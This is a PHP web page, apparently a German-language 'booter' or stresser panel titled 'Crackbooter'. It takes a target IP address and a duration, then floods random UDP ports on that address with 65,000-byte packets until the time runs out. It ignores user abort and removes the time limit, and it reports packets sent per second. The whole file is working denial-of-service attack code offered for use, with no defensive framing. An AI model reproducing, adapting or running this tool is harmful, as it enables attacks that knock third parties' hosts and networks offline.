<html>
	<head>
		<title>~Crackbooter~</title>
		<link href="css/bootstrap.css" rel="stylesheet"/>
		<link href="css/style.css" rel="stylesheet"/>
		<meta charset="utf-8"/>
	</head>
<body>
	<div class="container">
		   <form method="get">
				<div class="container middle mbi">
					<img src= "http://discover-santos.de/gg/crackstresser.gif" alt="test"/>
				</div>
				<?php
					 if(isset($_GET['host']) && isset($_GET['time'])){
						$host = $_GET['host'];
						$time = $_GET['time'];
						if(is_numeric($time) && filter_var($host, FILTER_VALIDATE_IP)){
						  $packets = 0;
						  ignore_user_abort(TRUE);
						  set_time_limit(0);
						  $exec_time = $_GET['time'];
						  $time = time();
						  $max_time = $time+$exec_time;
						  $host = $_GET['host'];
						  for($i=0;$i<65000;$i++){
								$out .= 'X';
						  }

						  while(1){
								$packets++;

								if(time() > $max_time){
									 break;
								}

								$rand = rand(1,65000);
								$fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);

								if($fp){
									 fwrite($fp, $out);
									 fclose($fp);
								}

						  }
						  $e = "Boot abgeschlossen: $packets (" . round(($packets*65)/1024, 2) . " MB) packets mit einem Durchschnitt von ". round($packets/$exec_time, 2) . " Packete pro Sekunde.";
						  ?>
						  <ul class="list-group">
							  <li class="list-group-item list-group-item-success"><?php echo htmlentities($e); ?></li>
						  </ul>
						  <?php
					  }else{
						  $e = "Deine Angaben waren Fehlerhaft.";
						  ?>
						  <ul class="list-group">
							  <li class="list-group-item list-group-item-danger"><?php echo htmlentities($e); ?></li>
						  </ul>
						  <?php
					  }
				}
				?>
				<div class="input-group mbi">
				 <span class="input-group-addon" id="basic-addon1">IP Adresse</span>
				 <input class="form-control" type="text" name="host" <?php
				 if(isset($_GET['host'])){
					 echo "value='" . htmlentities($_GET['host']) . "'";
				 }
				 ?>placeholder="1.2.3.4" aria-describedby="basic-addon1">
			 	</div>
				<div class="input-group mbi">
				 <span class="input-group-addon" id="basic-addon2">Sekunden</span>
				 <input class="form-control" type="text" name="time" <?php
				 if(isset($_GET['time'])){
					 echo "value='" . htmlentities($_GET['time']) . "'";
				 }
				 ?>placeholder="30" aria-describedby="basic-addon2">
				</div>
				<div class="input-group">
				 <button type="submit" class="form-control btn btn-success">DownIT</button>
				</div>
		 	</form>
	</div>
</body>
</html>
